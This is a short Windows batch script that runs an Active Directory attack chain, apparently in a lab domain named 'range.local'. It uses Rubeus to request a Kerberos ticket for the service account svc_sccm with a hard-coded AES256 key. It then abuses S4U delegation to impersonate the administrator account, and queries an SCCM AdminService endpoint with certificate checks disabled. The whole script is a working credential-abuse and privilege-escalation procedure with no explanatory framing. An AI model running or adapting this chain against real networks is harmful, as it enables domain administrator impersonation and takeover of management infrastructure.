@echo off
set RB=C:\Tools\ADTools\Rubeus.exe
set MP=mbr02.range.local
set K=C:\Windows\Temp\svc_sccm_tgt.kirbi
echo === ASKTGT ===
%RB% asktgt /user:svc_sccm /aes256:54D4BFDC9CD3B8885E6EEE6AA2AC04058C80D57D13EA70708CF7ABECB1927012 /domain:range.local /dc:dc03.range.local /ptt /nowrap /outfile:%K% 1>nul 2>&1
echo === S4U ===
%RB% s4u /ticket:%K% /impersonateuser:administrator /msdsspn:HTTP/mbr02.range.local /dc:dc03.range.local /ptt /nowrap 1>nul 2>&1
echo === KLIST ===
klist
echo === POWERSHELL IWR -UseDefaultCredentials ===
powershell -NoProfile -ExecutionPolicy Bypass -Command "$x=[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true}; try { $r=Invoke-WebRequest -Uri 'https://mbr02.range.local/AdminService/wmi/SMS_Site' -UseDefaultCredentials -Method Get -TimeoutSec 30; Write-Output ('PS_STATUS=' + $r.StatusCode); Write-Output ('PS_BODY=' + $r.Content.Substring(0,[Math]::Min(300,$r.Content.Length))) } catch { Write-Output ('PS_ERR=' + $_.Exception.Message) }"
echo === IWR_DONE ===
